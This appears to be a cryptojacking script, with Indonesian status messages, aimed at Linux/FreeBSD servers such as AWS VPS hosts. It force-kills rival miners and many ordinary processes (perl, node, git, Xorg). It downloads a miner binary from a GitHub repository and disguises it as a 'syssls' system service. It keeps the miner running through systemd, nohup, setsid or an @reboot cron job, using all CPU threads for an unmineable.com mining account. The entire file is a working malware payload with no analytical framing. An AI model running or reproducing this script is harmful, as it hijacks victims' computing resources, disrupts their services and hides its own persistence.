#!/bin/bash
ps -ef | awk '/upgrade|update|xmrig|miner|ethminer|cpuminer|bminer|syssls|Ice-Unix|tailah|jancok|masscan|screen|cpu-miner|upx|minerd|dx|Font-unix|gelud|ICE-unix|kworker|perl|ld-linux-x86-64|node|power2b|sampah|Xorg|hellminer|git|gui/{print $2}' | xargs kill -9

echo "Semua proses miner yang ditemukan telah dibunuh."
cd /tmp

OS=$(uname)
hostnamets=$(uname -n)

if [[ ! -f "/tmp/syssls" ]]; then
    echo "File syssls tidak ditemukan, proses unduhan."
    if [[ "$OS" == "FreeBSD" ]]; then
        URL="https://github.com/shafafery/shafafery.github.io/raw/refs/heads/main/freebsd.tar.gz"
    else
        URL="https://github.com/shafafery/shafafery.github.io/raw/refs/heads/main/syssls.tar.gz"
    fi

    if command -v curl &> /dev/null; then
        curl -L "$URL" | tar zx
    elif command -v wget &> /dev/null; then
        wget -O - "$URL" | tar zx
    else
        echo "curl dan wget tidak tersedia. Tidak dapat mengunduh file."
        exit 1
    fi
fi

if [ "$(id -u)" -eq 0 ]; then
    cp /tmp/syssls /usr/bin/syssls
    chmod +x /usr/bin/syssls
    EXEC_PATH="/usr/bin/syssls"
else
    EXEC_PATH="/tmp/syssls"
fi

if command -v curl &> /dev/null; then
    IP_PUBLIC=$(curl -s http://ipecho.net/plain)
elif command -v wget &> /dev/null; then
    IP_PUBLIC=$(wget -qO- http://ipecho.net/plain)
else
    echo "curl dan wget tidak tersedia. Tidak dapat mengambil IP publik."
    exit 1
fi

IP_LOCAL=$(hostname -I | awk '{print $1}')

IP_PUBLIC_REPLACED=$(echo "$IP_PUBLIC" | sed 's/\./-/g')
IP_LOCAL_REPLACED=$(echo "$IP_LOCAL" | sed 's/\./-/g')
HOSTNAME_REPLACED=$(echo "$hostnamets" | sed 's/\./-/g')

if [[ "$IP_PUBLIC" =~ : ]]; then
    IP_TO_USE=$IP_LOCAL_REPLACED
else
    IP_TO_USE=$IP_PUBLIC_REPLACED
fi

echo "IP yang digunakan (dengan tanda hubung): $IP_TO_USE (AWS VPS)"

if command -v systemctl &> /dev/null; then
    if [ "$(id -u)" -eq 0 ]; then
        echo -e "[Unit]
Description=SYSSLS
After=network.target

[Service]
Type=simple
Restart=on-failure
RestartSec=15s
ExecStart=$EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 1843038386.AWS VPS --cpu-max-threads-hint=100

[Install]
WantedBy=multi-user.target" > /etc/systemd/system/syssls.service

        chmod 644 /etc/systemd/system/syssls.service
        systemctl daemon-reload
        systemctl enable syssls.service
        systemctl start syssls.service

        echo "Systemd service untuk SYSSLS telah dibuat, dimuat, dan dimulai."
        echo "Worker : VPS-AWS VPS"
    else
        if command -v nohup >/dev/null 2>&1; then
            nohup $EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 1843038386.AWS VPS --cpu-max-threads-hint=100 > /tmp/.logacil 2>&1 &
            echo "Menjalankan miner dengan nohup."
            echo "Worker : AWS VPS"
        elif command -v setsid >/dev/null 2>&1; then
            setsid $EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 1843038386.AWS VPS --cpu-max-threads-hint=100 > /tmp/.logacil 2>&1 &
            echo "Menjalankan miner dengan setsid."
        else
            crontab -l | { cat; echo "@reboot $EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 1843038386.AWS VPS --cpu-max-threads-hint=100 > /tmp/.logacil 2>&1 &"; } | crontab -
            echo "Cron job untuk menjalankan miner saat reboot telah ditambahkan."
            echo "Worker : AWS VPS"
        fi
    fi
else
    echo "systemctl tidak ditemukan, mencoba menggunakan crontab..."
    if [ "$(id -u)" -ne 0 ]; then
        crontab -l | { cat; echo "@reboot $EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 1843038386.AWS VPS --cpu-max-threads-hint=100 > /tmp/.logacil 2>&1 &"; } | crontab -
        echo "Cron job untuk menjalankan miner saat reboot telah ditambahkan."
        echo "Worker : AWS VPS"
    elif command -v nohup >/dev/null 2>&1; then
        nohup $EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 1843038386.AWS VPS --cpu-max-threads-hint=100 > /tmp/.logacil 2>&1 &
        echo "Menjalankan miner dengan nohup karena systemctl tidak tersedia."
        echo "Worker : AWS VPS"
    elif command -v setsid >/dev/null 2>&1; then
        setsid $EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 1843038386.AWS VPS --cpu-max-threads-hint=100 > /tmp/.logacil 2>&1 &
        echo "Menjalankan miner sebagai user non-root dengan setsid."
    fi
fi
